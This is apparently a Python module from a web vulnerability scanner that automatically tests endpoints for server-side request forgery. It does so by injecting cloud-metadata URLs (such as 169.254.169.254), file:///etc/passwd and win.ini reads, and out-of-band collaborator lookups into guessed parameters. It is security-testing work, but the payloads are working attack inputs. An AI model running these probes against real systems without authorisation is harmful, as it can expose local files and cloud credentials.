from __future__ import annotations
from huntnyx.core.common import *  # noqa: F401,F403


# Parameter names that commonly carry a URL / host the server will fetch.
_SSRF_PARAM_HINTS = (
    "url", "uri", "link", "src", "source", "dest", "destination", "redirect",
    "redirect_uri", "target", "fetch", "fetchurl", "load", "site", "host",
    "hostname", "domain", "page", "feed", "rss", "callback", "webhook",
    "proxy", "proxyurl", "image", "imageurl", "img", "imgurl", "photo",
    "avatar", "file", "filepath", "path", "document", "doc", "open",
    "continue", "next", "reference", "ref", "remote", "resource", "endpoint",
    "server", "api", "preview", "thumbnail", "screenshot", "render", "pdf",
    "content", "location", "forward", "goto", "to", "out", "view", "window",
    "download", "upload", "data", "conn", "connection", "address",
)


# Cloud-metadata endpoints and the signatures that PROVE the server fetched
# them. Each regex is deliberately built from tokens that (a) appear in the
# metadata directory listing and (b) rarely co-occur in ordinary HTML, so a
# match is strong, low-false-positive proof of SSRF.
_METADATA_PROBES = [
    ("AWS IMDS",
     "http://169.254.169.254/latest/meta-data/",
     re.compile(r"\b(ami-id|instance-id|instance-type|iam/|public-keys/?|"
                r"local-ipv4|placement/|reservation-id|security-groups)\b", re.I)),
    ("GCP metadata",
     "http://metadata.google.internal/computeMetadata/v1/instance/",
     re.compile(r"\b(computeMetadata|service-accounts/?|hostname|"
                r"machine-type|zone)\b", re.I)),
    ("Alibaba metadata",
     "http://100.100.100.200/latest/meta-data/",
     re.compile(r"\b(instance-id|image-id|region-id|zone-id|"
                r"private-ipv4|serial-number)\b", re.I)),
    ("DigitalOcean metadata",
     "http://169.254.169.254/metadata/v1/",
     re.compile(r"\b(droplet_id|interfaces/?|floating_ip|region|"
                r"dns/?|vendor_data)\b", re.I)),
]

# file:// scheme abuse — a full-URL param that accepts file:// is SSRF (and
# reads local files). Confirmed by a marker only the real file contains.
_FILE_PROBES = [
    ("file:///etc/passwd",
     re.compile(r"root:.*?:0:0:", re.I)),
    ("file:///c:/windows/win.ini",
     re.compile(r"\[fonts\]|\[extensions\]|16-bit app support", re.I)),
]

# Curated names to guess on discovered endpoints that expose no params yet.
_SSRF_SPEC_NAMES = (
    "url", "uri", "target", "dest", "redirect", "image", "img", "file",
    "path", "host", "domain", "fetch", "load", "proxy", "callback", "feed",
    "page", "site", "link", "src", "next", "open",
)


def _ssrf_tag(url, name):
    return "ssrf_" + re.sub(r"\W+", "_", url + name)[:34]


def _snippet(rx, body):
    m = rx.search(body or "")
    if not m:
        return ""
    s = max(0, m.start() - 16)
    e = min(len(body), m.end() + 48)
    return "…" + re.sub(r"\s+", " ", body[s:e]).strip() + "…"


def _payload_set(config):
    """(label, payload_url, signature_regex) probes enabled by config."""
    probes = []
    if config.get("ssrf.metadata", True):
        probes += list(_METADATA_PROBES)
    if config.get("ssrf.file_scheme", True):
        probes += [(f"file read ({p})", p, rx) for (p, rx) in _FILE_PROBES]
    return probes


def _send(url, method, all_params, param, payload, config, runner, tag):
    """Inject `payload` into `param`; other params get a filler value.
    Returns (status, body, example_url)."""
    data = {p: "1" for p in all_params}
    data[param] = payload
    if method == "GET":
        full = _build_url(url, data)
        status, _hd, body, _res = _curl_full(url=full, config=config, runner=runner,
                                              tag=tag, extra=["--max-redirs", "0"])
        return status, body, full
    status, _hd, body, _res = _curl_full(url=url, config=config, runner=runner, tag=tag,
                                         extra=["--data", urlencode(data), "--max-redirs", "0"])
    return status, body, url + f"  (POST body {param}=…)"


def _ssrf_probe(url, method, all_params, param, config, runner, baseline_body):
    """Try every enabled probe against one (endpoint, param). A hit is only
    recorded when the metadata/file signature appears in the response AND was
    NOT already in the baseline body (rules out pages that legitimately echo a
    token). Returns a finding dict or None."""
    tagbase = _ssrf_tag(url, param)
    for label, payload, rx in _payload_set(config):
        status, body, example = _send(url, method, all_params, param, payload,
                                       config, runner, tagbase)
        if body and rx.search(body) and not (baseline_body and rx.search(baseline_body)):
            return {"payload": payload, "probe": label, "method": method,
                    "where": f"response body (HTTP {status})",
                    "evidence": _snippet(rx, body), "example": example}

    # Blind / OOB: only when an out-of-band collaborator host is configured.
    # We cannot self-confirm, so it is emitted as a review item.
    collab = (config.get("ssrf.collaborator") or "").strip()
    if collab:
        collab = re.sub(r"^[a-zA-Z][\w+.\-]*://", "", collab).strip("/")
        marker = _rand(10)
        payload = f"http://{marker}.{collab}/"
        status, _body, example = _send(url, method, all_params, param, payload,
                                       config, runner, tagbase + "_oob")
        return {"payload": payload, "probe": "OOB collaborator", "method": method,
                "where": "blind — check your OAST logs",
                "evidence": f"expected DNS/HTTP lookup for {marker}.{collab} (HTTP {status})",
                "example": example, "review": True}
    return None


def _baseline_body(url, method, all_params, param, config, runner):
    data = {p: "1" for p in all_params}
    data[param] = "ssrfcanary" + _rand(4)
    tag = "ssrf_base_" + _ssrf_tag(url, param)
    if method == "GET":
        _s, _h, body, _r = _curl_full(url=_build_url(url, data), config=config,
                                      runner=runner, tag=tag)
    else:
        _s, _h, body, _r = _curl_full(url=url, config=config, runner=runner, tag=tag,
                                      extra=["--data", urlencode(data)])
    return body or ""


def _ssrf_spec_probe(target, config, runner, result):
    """Autonomy without --url: guess SSRF-style parameter names on every
    discovered endpoint (crawl pages / content dirs / web roots) that wasn't
    already tested with a real parameter. Uses only the two strongest proofs
    (AWS IMDS + /etc/passwd) and confirms by signature, keeping it bounded and
    false-positive-free."""
    probes = []
    if config.get("ssrf.metadata", True):
        probes.append((_METADATA_PROBES[0]))
    if config.get("ssrf.file_scheme", True):
        probes.append(("file read (file:///etc/passwd)", _FILE_PROBES[0][0],
                       _FILE_PROBES[0][1]))
    if not probes:
        return

    tested = {(urlsplit(f["url"]).netloc, urlsplit(f["url"]).path)
              for f in result["findings"]}
    disc = set()
    crawl = target.results.get("crawl") or {}
    for u in crawl.get("urls", []):
        disc.add(u)
    content = target.results.get("content") or {}
    for e in content.get("services", []):
        base = e.get("url", "")
        for f in e.get("found", []):
            if (f.get("status") or 0) in (200, 301, 302, 401, 403):
                disc.add(base.rstrip("/") + "/" + (f.get("path") or "").lstrip("/"))
    for s in target.web_services:
        disc.add(s.url)

    cap = int(config.get("active.max_endpoints", 60) or 60)
    delay = float(config.get("active.delay", 0) or 0)
    n = 0
    for u in sorted(x for x in disc if x):
        sp = urlsplit(u)
        if not sp.scheme.startswith("http"):
            continue
        if (sp.netloc, sp.path) in tested:
            continue
        base = urlunsplit((sp.scheme, sp.netloc, sp.path, "", ""))
        n += 1
        if n > cap:
            break
        for name in _SSRF_SPEC_NAMES:
            hit = None
            for label, payload, rx in probes:
                url = base + "?" + urlencode({name: payload})
                status, _hd, body, _res = _curl_full(url=url, config=config, runner=runner,
                                                      tag="ssrf_spec_" + _ssrf_tag(base, name))
                if body and rx.search(body):
                    hit = {"url": base, "param": name, "method": "GET",
                           "payload": payload, "probe": label,
                           "where": f"response body (HTTP {status})",
                           "evidence": _snippet(rx, body), "example": url}
                    break
                if delay:
                    time.sleep(delay)
            if hit:
                result["findings"].append(hit)
                UI.ok(f"SSRF (GET): {base} [{name}]")
                UI.dim(f"      -> {hit['example']}")
                UI.dim(f"      probe: {hit['probe']}  {hit.get('evidence','')}")


def phase_ssrf(target, config, runner):
    result = {"findings": [], "errors": []}
    gets = _active_targets(target)
    forms = _post_forms(target)
    crawl = target.results.get("crawl") or {}
    content = target.results.get("content") or {}
    has_disc = bool(gets or forms or crawl.get("urls")
                    or content.get("services") or target.web_services)
    if not has_disc:
        result["errors"].append("no endpoints to test (run crawl/content first)")
        UI.warn("ssrf: nothing to test")
        return result
    if not (config.get("ssrf.metadata", True) or config.get("ssrf.file_scheme", True)
            or (config.get("ssrf.collaborator") or "").strip()):
        result["errors"].append("all SSRF probes disabled in config")
        UI.warn("ssrf: all probes disabled")
        return result

    delay = float(config.get("active.delay", 0) or 0)
    max_ep = int(config.get("active.max_endpoints", 60) or 60)
    collab = (config.get("ssrf.collaborator") or "").strip()
    tested = 0

    UI.info("ssrf scan (cloud-metadata / file-scheme proof)")
    UI.dim(f"      testing {len(gets)} GET endpoints, {len(forms)} POST forms")
    if collab:
        UI.dim(f"      OOB collaborator set: {collab} (blind hits need OAST verification)")

    def run_point(url, method, params, param):
        nonlocal tested
        tested += 1
        baseline = _baseline_body(url, method, params, param, config, runner)
        hit = _ssrf_probe(url, method, params, param, config, runner, baseline)
        if hit:
            result["findings"].append({"url": url, "param": param, **hit})
            lvl = "SSRF (review)" if hit.get("review") else "SSRF"
            UI.ok(f"{lvl} ({hit['method']}): {url} [{param}]")
            UI.dim(f"      -> {hit.get('example', url)}")
            UI.dim(f"      probe: {hit.get('probe')}  {hit.get('evidence','')}")
        if delay:
            time.sleep(delay)

    for pe in gets[:max_ep]:
        for param in sorted(pe["params"],
                            key=lambda p: (p.lower() not in _SSRF_PARAM_HINTS, p)):
            run_point(pe["url"], "GET", pe["params"], param)
    for fm in forms[:max_ep]:
        for field in sorted(fm["inputs"],
                            key=lambda p: (p.lower() not in _SSRF_PARAM_HINTS, p)):
            run_point(fm["action"], "POST", fm["inputs"], field)

    _ssrf_spec_probe(target, config, runner, result)

    # de-duplicate on (url, param, probe)
    best = {}
    for f in result["findings"]:
        best[(f.get("url"), f.get("param"), f.get("probe"))] = f
    result["findings"] = list(best.values())

    confirmed = [f for f in result["findings"] if not f.get("review")]
    review = [f for f in result["findings"] if f.get("review")]
    if confirmed:
        UI.ok(f"found {len(confirmed)} confirmed SSRF")
    if review:
        UI.warn(f"{len(review)} blind SSRF candidate(s) — verify via OAST")
    if not confirmed and not review:
        UI.dim(f"      no SSRF found ({tested} parameters tested)")
    return result


def _r_ssrf(d):
    lines = _sec("SSRF (server-side request forgery)")
    fs = d.get("findings", [])
    if not fs:
        note = d.get("errors", [])
        lines.append("  " + ("none found" if not note else note[0]))
        return lines + [""]
    for f in fs:
        tag = "  [review: blind/OOB]" if f.get("review") else "  [CONFIRMED]"
        lines.append(f"  {f.get('method','GET')} {f['url']}  [{f['param']}]{tag}")
        if f.get("example"):
            lines.append(f"      URL     : {f['example']}")
        lines.append(f"      payload : {f.get('payload','')}")
        lines.append(f"      probe   : {f.get('probe','')}")
        if f.get("evidence"):
            lines.append(f"      evidence: {f['evidence']}")
        lines.append(f"      via     : {f.get('where','response body')}")
    return lines + [""]
